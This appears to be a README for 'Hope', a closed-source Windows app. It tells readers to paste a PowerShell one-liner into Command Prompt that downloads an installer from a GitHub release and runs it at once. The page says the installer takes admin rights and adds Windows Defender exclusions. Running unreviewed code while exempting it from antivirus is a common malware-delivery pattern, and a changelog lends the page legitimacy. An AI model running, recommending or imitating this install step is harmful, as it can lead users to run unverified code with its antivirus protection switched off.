# Hope — release binaries

Download host for Hope. The source lives in a separate private repository.

## How to Install

Get Hope running on Windows in under 30 seconds. Install with one command.

### 1 — Open Command Prompt

Press **Win + R**, type `cmd`, and hit Enter. Or search for "Command Prompt" in the Start menu.

### 2 — Paste the Command

Copy the command below and paste it into your Command Prompt window. Right-click to paste.

Paste exactly this (copy the whole line — there is nothing else to type):

```cmd
powershell -Command "irm https://github.com/muleimm/h-releases/releases/download/v1.2.4/HopeSetup-1.2.4.exe -OutFile $env:TEMP\HopeSetup-1.2.4.exe; Start-Process $env:TEMP\HopeSetup-1.2.4.exe"
```

### 3 — Press Enter & Done!

Hit **Enter**. The Hope installer downloads, asks for admin permission, and installs itself. A Hope shortcut appears on your Desktop when it's done.

> **What happens when you run this?**
>
> → Downloads the Hope installer automatically
> → One admin prompt, that's it
> → Adds Windows Defender exclusions for you
> → Desktop shortcut when it's done

## Details

- **Requirements:** Windows 10/11 (64-bit). No prerequisites — the installer adds the browser runtime silently if it is missing.
- **Install location:** `C:\Program Files\Hope`
- **Uninstall:** *Settings → Apps → Hope 1.2.4 → Uninstall*, or run `C:\Program Files\Hope\unins000.exe`
- **Verify your download:** SHA-256 of `HopeSetup-1.2.4.exe` — `EBBE8AF26EF68B5488EAC3CBD087E6EDDAC2CCF049DEF9D07C26405639815C1D`

## What's new in 1.2.4

- **Sign in again** no longer costs you your device: the activation survives, with stored device credentials held behind fresh account checks. **Sign Out** still clears account and device.
- Auth failures say which one they are — a connection problem offers **Try again**, an expired session offers **Sign in again**.
- Account tokens now carry the account generation they were issued for, so a late refresh cannot overwrite the account you are actually signed in to. Session files are written atomically.

Latest release: [v1.2.4](https://github.com/muleimm/h-releases/releases/tag/v1.2.4) · All releases are kept and never overwritten.
